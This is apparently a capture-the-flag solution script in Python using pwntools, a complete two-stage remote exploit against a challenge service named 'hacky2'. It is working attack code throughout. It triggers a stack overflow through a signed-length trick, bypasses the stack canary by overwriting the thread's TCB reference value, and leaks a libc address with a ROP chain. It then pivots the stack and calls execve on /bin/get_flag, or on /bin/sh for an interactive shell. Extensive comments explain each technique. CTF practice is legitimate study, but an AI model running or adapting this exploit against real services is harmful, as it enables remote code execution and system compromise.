#!/usr/bin/python3

#import libraries
import sys
import time
from pathlib import Path
from ctypes import CDLL
from itertools import count
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky2"
port = 13715
#set default path to libc object file
libc_filename = "./patched_libc-2.31.so"
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])
if len(sys.argv) >= 4:
    libc_filename = sys.argv[3]


#Set this to True if you wand an interactive shell INSTEAD of the flag.
spawn_interactive_shell = False

#The Server's pseudo-randomization is deterministic and simply uses unix timestam as a seed.
#Set this to True to attempt to guess the word that will be chosen based on the currend time and 
#  glibc's srand/rand functions instead of always trying the most common one.
#Note that this functionality sources the srand and rand functions from the actual libc object 
#  file. So make sure that the default filename and location are set correctly or passed to the
#  exploit as the third argument (after host and port).
use_timesynced_seed = True
#If we didn't hit we're probably out of sync and the Server's "randomization" only changes every 
#  second. So better don't be to quick and wait a bit until we try again.
#Number of seconds to wait between attempts:
sleep_interval = 0.8
#use the seed_offset variable to correct for asynchronous clocks
seed_offset = 0


#That only has an advantage if our clock is in sync with the server
#If they're out of sync, it still works, but not better than random bruteforce
if use_timesynced_seed == True:
    libc_path = Path(libc_filename).expanduser().resolve()
    print("(-) Timesynced seed-based length predictions with glibc srand enabled.")
    if libc_path.is_file():
        print(f"(-) glibc object file '{libc_filename}' is present.")
        libc = CDLL(libc_path)
    else:
        print(f"(-) glibc object file '{libc_filename}' not found at {libc_path}. Using Fallback option.")
        use_timesynced_seed = False
if use_timesynced_seed != True:
    print("(-) Timesynced seed-based length predictions with glibc srand disabled.")


#This is where the exploit lives.
def exploit():

    #Note that PIE is disabled, but ASLR, NX, Stack Canaries and full RELRO are enabled
    #Importantly we thus trivially know all the offsets within the vuln binary, but cannot easily 
    #  override the got without mprotect magic.

    #These are constants taken from vuln.c, thar are primarily used to determine the initial 
    #  length of buf's content, to which our input is appended.
    #Depending on which word is chosen, our input will shift on the stack by a few bytes.
    mot_fixed = "Hack , "
    mot_var   = ["stronger", "faster", "better", "harder", "more", "now", "like it was a steak", "https://youtu.be/ErVZr2DEiss"]

    #The following number is used as an input to trigger the initial overflow:
    #  −0xFFFFF001 = 0xFFFFFFFF00000FFF = −4294963201
    #  The input is initially converted to a 64 Bit number
    #    => interpreted as negative number during size comparisons
    #  When used to restrict the input length of read, only the lower 32 Bit are considered
    #    => interpreted as large positive number
    #  INPUT: -0xFFFFFF001
    #    => set maximum input length for buf of size 256 to 4095 bytes (choose larger if needed)
    #    => large overflow on stack (can overflow far beyond return address)
    trigger_ofl_4095 = b"-0xFFFFFF001"

    #Those are all static offsets taken from the vuln binary
    #We'll use those in our ROP chain
    addr_pop_rdi_gadget     = 0x4018eb
    addr_pop_rsi_r15_gadget = 0x4018e9
    addr_pop_rsp_rbp_gadget = 0x4017eb
    addr_puts_got_entry     = 0x403f60
    addr_puts_plt_entry     = 0x401060
    addr_mot_array          = 0x404020
    addr_strlen_plt_entry   = 0x401080
    addr_vuln_sock_read     = 0x401262
    #The file descriptor of stdin is 0 by default
    fd_stdin                = 0x0

    #first call puts to leak a libc address
    #since ASLR is enabled we don't know the libc's location in our first ROP chain
    ropchain_01  = p64(addr_pop_rdi_gadget)
    ropchain_01 += p64(addr_puts_got_entry)
    ropchain_01 += p64(addr_puts_plt_entry)
    #Leverage side effects strlen called on a known string to set rdx to a high number.
    #We need this since we don't have an rdx gadget but want to call sock_read without 
    #  overly restrictive input size limitations (third argument in rdx).
    ropchain_01 += p64(addr_pop_rdi_gadget)
    ropchain_01 += p64(addr_mot_array)
    ropchain_01 += p64(addr_strlen_plt_entry)
    #Now call sock_read to read form stdin to the mot array.
    #The array mot[][] is a statically initialized global variable in vuln.c, and is hence located 
    #  in the .data section.
    #Other than for the stack and the heap we already know it's address, since PIE is disabled.
    ropchain_01 += p64(addr_pop_rsi_r15_gadget)
    ropchain_01 += p64(addr_mot_array)
    ropchain_01 += p64(0)
    ropchain_01 += p64(addr_pop_rdi_gadget)
    ropchain_01 += p64(fd_stdin)
    ropchain_01 += p64(addr_vuln_sock_read)
    #NOW READ THE SECOND ROPCHAIN TO THE MOT ARRAY! Notably the second ROP chain is constructed 
    #  AFTER the libc leak, which meand it can contain arbitrary libc addresses.
    #Then use a 'pop rsp ; pop rbp ; ret" gadget' from the vuln binary to move the stack to the 
    #  second ROP chain that lives within the mot array, and return to it.
    ropchain_01 += p64(addr_pop_rsp_rbp_gadget)
    ropchain_01 += p64(addr_mot_array)
    ropchain_01 += p64(addr_mot_array)
    #AND THUS WE TRIGGERED THE SECOND ROP CHAIN

    #Size of the buffer on the stack
    bufsize = 0x200;
    #Space occupied by saved registers, stack canary, etc. located between the buffer and the 
    #  return address of motivate()
    stack_content_after_buf = 0x28

    #As mentioned above Stack canaries are enabled for our vuln binary.
    #Although we have identified a buffer overflow that can easily trigger an override of the 
    #  return address, we will also destroy the stack canary in the process.
    #Before our function returns the program would attempt to verify the canary's integrity, 
    #  by comparing it to a reference value. It would then notice the changes and trigger a 
    #  SIGABRT signal to kill the process before triggering our ROP chain.
    #This is where the fact that we're within a thread spawned by pthread_create comes into play:
    #  Generally multiple threads within the same process share the same address space, but have 
    #  seperate stacks. Also some management information needs to be handled for each stack.
    #  The way this is set up in the pthread library, causes an instance of the struct tcbhead_t 
    #  data structure to be placed at the very top of each additional thread's stack.
    #  This data structure coincidentally contains the reference value that is compared against 
    #  the stack canary on return to check for manipulations.
    #This setup (one might call it a design flaw) allows us to simply override both the stack 
    #  canary as well as the reference value with the same value (e.g. 0) to make the check 
    #  succeed despite our manipulation, as long as we have a buffer overflow that is large 
    #  enough to reach the reference value's location.
    #More information about this issue (and related techniques) can be found here:
    #  https://bugzilla.redhat.com/show_bug.cgi?id=1535038
    #  https://sourceware.org/bugzilla/show_bug.cgi?id=22850
    #  https://bases-hacking.org/tcb-overwrite.html
    #  https://blog.talosintelligence.com/bypassing-miniupnp-stack-smashing/


    #This is the additional offset needed following our ROP chain to reach the canary reference
    #  value within struct tcbhead_t on the stack. The offset stays consistent across executions 
    #  of the program on the same system and has been determined using gdb.
    #The data written between the ROP chain and the reference value can be more or less arbitrary.
    #After this another 8 byte need to be written to actually override the reference value itself.
    #Note that we could actually write more data after that and the exploit would still work. This 
    #  is just a lower bound of bytes that need to be overwritten.
    offset_tcb_stackcanary_reference = 0x830 - len(ropchain_01)

    #These are some offsets relative to libc's start address, that we determined using the libc 
    #  object file that corresponds to the server's libc.
    offset_libc_puts           = 0x072230
    offset_libc_execve         = 0xc7c00
    offset_libc_pop_rdx_gadget = 0x0c770d

    #Everything from now on will run in a loop, since we want to retry if we failed.
    #However, if your clock is in sync with the server's and you have our seed-based length 
    #prediction enabled, we should succeed on the first try most of the time.
    for runcnt in count():
        print(f"Run #{runcnt:{0}3d}:")

        #Since srand is called in main as soon as the connection is established, we measure 
        #  the timestamp before and after establishing the connection (to account for RTT if 
        #  the connection is slow) and use the rounded average as our srand seed.
        timestamp_01 = time.time()
        proc = remote(host,port,fam="ipv4")
        timestamp_02 = time.time()

        if use_timesynced_seed == True:
            #If seed-based predictions are enabled, we initialize srand(), poll result=rand() and 
            #  check the wordlength of the word at index [result mod 8] in the mot array, to mimic 
            #  vuln's behaviour and hopefully get a matching result.
            likely_seed = int(timestamp_01 + ((timestamp_02 - timestamp_01)/2) + seed_offset)
            libc.srand(likely_seed)
            motivational_word_len_prediction = len(mot_var[libc.rand()%8])
            print(f"(-) Making timestamp based prediction for length of motivational word ({motivational_word_len_prediction}).")
        else:
            #If seed-based predictions are disabled, we simply hardcode 6 as the predicted word 
            #  length, since this is the most common length in the array (both in absolute numbers 
            #  as well as mod 8): This triggers in 3 out of 8 possible cases.
            motivational_word_len_prediction = 6
            print(f"(-) Using hardcoded prediction for length of motivational word ({motivational_word_len_prediction}).")
        likely_bufcontent_len = len(mot_fixed) + motivational_word_len_prediction
        
        #Now we assemble our first actual exploit string, by concatenating the following things:
        #  - A string of NULL bytes that is almost long enough to cover everything from the start 
        #      of the buffer to the beginninhg of motivate()'s return address, but compensates for 
        #      the length of the additional data added to the buffer in vuln.
        #    If our prediction above was correct, the return address is the next thing that will be 
        #      overridden.
        #    Also note that this overrides the stack canary with NULL bytes as well. It is not 
        #      important what exact values we choose here, as long as we override the reference 
        #      value with the same ones later on. Less unecessary complexity generally makes it 
        #      easier and less error-prone though.
        #  - After that we add our ROP chain designed above.
        #  - Then we continue to write NULL bytes to the stack until we reach the reference value.
        #  - Finally the reference wallue is overwritten with NULL bytes as well and the exploit 
        #      string is terminated.
        exploit_str_01  = (bufsize + stack_content_after_buf - likely_bufcontent_len) * b"\x00"
        exploit_str_01 += ropchain_01
        exploit_str_01 += offset_tcb_stackcanary_reference * b"\x00"
        exploit_str_01 += p64(0)
        exploit_str_01 += b"\n"

        #Now let's deploy the first stage of the exploit
        print("(-) Retrieving initial response from the server.")
        tmp_response = proc.readuntil(b"How long is your name?\n")
        proc.write(trigger_ofl_4095 + b"\n")
        tmp_response = proc.readuntil(b"What is your name?\n")
        print("(-) Sending layer one exploit string.")
        proc.write(exploit_str_01)
        
        #At this point we will wait for a response.
        #If everything went well vuln will now expect an input triggered by our ROP chain.
        #If our prediction was faulty though, our ROP chain has been shifted by a few bytes and 
        #  the program most likely crashed.
        #Hence we will handle EOFErrors in the following just to be sure.
        try:
            #First we retrieve the actual word that has been chosen by the server.
            tmp_response = proc.readuntil(b"Hack ")
            motivational_word = proc.readuntil(b", ")[:-2].decode()

            #If the word's length doesn't match our prediction, we can stop here and retry, since 
            #  the misalligned ROP chain will not have produced the desired result.
            if motivational_word in mot_var:
                print(f"(-) Successfully retrieved motivational Word: {motivational_word}")
                if len(motivational_word) != motivational_word_len_prediction:
                    print(f"(-) Length of motivational word ({len(motivational_word)}) does not match our prediction ({motivational_word_len_prediction}).", end='')
                    if use_timesynced_seed == True: print(" Is your clock out of sync with the server?", end='') 
                    print("")
                    proc.close()
                    sleep(sleep_interval)
                    continue
                else:
                    print(f"(-) Length of motivational word ({len(motivational_word)}) matches prediction.")
            else:
                print("(-) Couldn't retrieve motivational word.")
                proc.close()
                sleep(sleep_interval)
                continue

            #Now that that is out of the way, we go on to retrieve the puts address we leaked.
            #Since we chose NULL bytes as filler-data above, this will immediately follow the 
            #  b', ' part of the response.
            puts_leak = proc.readline()[:-1]

            #Since the puts address has been interpreted as a string but may include any bytes 
            #  including NULL bytes (\x00) and newlines (\x0a) we may sometimes fail to read 
            #  the full address. Since this happens very rarely in the overall context of this 
            #  exploit, we don't really handle this error any further and simply retry.
            #There would of course be ways to improve our odds here (such as printing more than 
            #  one libc address, handling newlines properly and exploring the potential of format 
            #  string based printf shenannigans), but since this hardly serves us any benefit 
            #  assymptotically, we'll leave it at that.
            if len(puts_leak) != 6:
                print("(-) Unlucky. That puts address must've contained a NULL byte or a newline character. That messed up our read operation.")
                proc.close()
                sleep(sleep_interval)
                continue

            #We can now convert the address of puts into a number and calculate arbitrary libc 
            #  addresses from hereon out. This gives us a lot more flexibility in the second 
            #  ROP chain we'll design in a minute.
            addr_libc_puts = int.from_bytes(puts_leak, 'little')
            print(f"(-) Successfully leaked libc address of function puts: {addr_libc_puts:#0{0}18x}")

            addr_libc_base           = addr_libc_puts - offset_libc_puts
            addr_libc_execve         = addr_libc_base + offset_libc_execve
            addr_libc_pop_rdx_gadget = addr_libc_base + offset_libc_pop_rdx_gadget

            #Keep in mind that we're no longer working on the original stack, but within the 
            #  boundaries of the mot buffer. This is more than enough for our ROP chain, but 
            #  fancy function calls with large stackframes will no longer be possible, since 
            #  those would overflow into other, non-writable sections of the binary.
            #This is one of the reasons why we built this ROP chain with execve and instead 
            #  of system.

            #The length of our ROP chain is hardcoded here solely for the reason that we don't 
            #  mess up the calculation of the address of our "/bin/get_flag" or "/bin/sh" string, 
            #  which is part of our input and needs to be referenced in the ROP chain.
            ropchain_02_len       = 8*8
            addr_executable_str   = addr_mot_array + 8 + ropchain_02_len
            
            #Now that we can make use of libc, we also have a lot more ROP gadgets available to
            #  us, making side effect magic as used above unnecessary.
            #We simply setup our registers for the execve syscall and invoke the syscall.
            ropchain_02  = p64(addr_pop_rdi_gadget)
            ropchain_02 += p64(addr_executable_str)
            ropchain_02 += p64(addr_pop_rsi_r15_gadget)
            ropchain_02 += p64(0)
            ropchain_02 += p64(0)
            ropchain_02 += p64(addr_libc_pop_rdx_gadget)
            ropchain_02 += p64(0)
            ropchain_02 += p64(addr_libc_execve)

            #This assert simply sanity checks the address of our executable path in memory.
            #It depends on the ROP chain's length since it's placed in memory after the chain.
            assert ropchain_02_len == len(ropchain_02)

            #You can choose between a shell and the flag by setting the spawn_interactive_shell 
            #  configuration variable above.
            if spawn_interactive_shell == True:
                executable_str = b"/bin/sh\x00"
            else:
                executable_str = b"/bin/get_flag\x00"

            #Finally we assemble our exploit string. We place both the ROP chain as well as the 
            #  path to our target executable at the location in memory our manipulated stack 
            #  pointer points to and we're done.
            exploit_str_02  = p64(0)
            exploit_str_02 += ropchain_02
            exploit_str_02 += executable_str
            exploit_str_02 += b"\n"

            #Deploy the second exploit string.
            print("(-) Sending layer two exploit string.")
            proc.write(exploit_str_02)

            #Now all that's left to do is enjoy our flag/shell.
            if spawn_interactive_shell == True:
                print("(-) Attempting to spawn interactive shell.")
                proc.interactive()
                proc.close()
                break
            else:
                print("(-) Attempting to retrieve flag.")
                flag = proc.readline()
                
                #This shouldn't go wrong at this point, but handling one too many errors seldom hurts...
                if b"flag" in flag:
                    print(f"(-) Successfully retrieved flag: \033[32m{flag.decode()}\033[0m")
                    proc.close()
                    break
                else:
                    print("(-) Could not retrieve flag.")
                    proc.close()
                    sleep(sleep_interval)
                    continue

        except EOFError:
            print("(-) Couldn't retrieve a response form the server. Try again...")
            proc.close()
            sleep(sleep_interval)
            continue

#Invoke the exploit when the script is executed.
exploit()


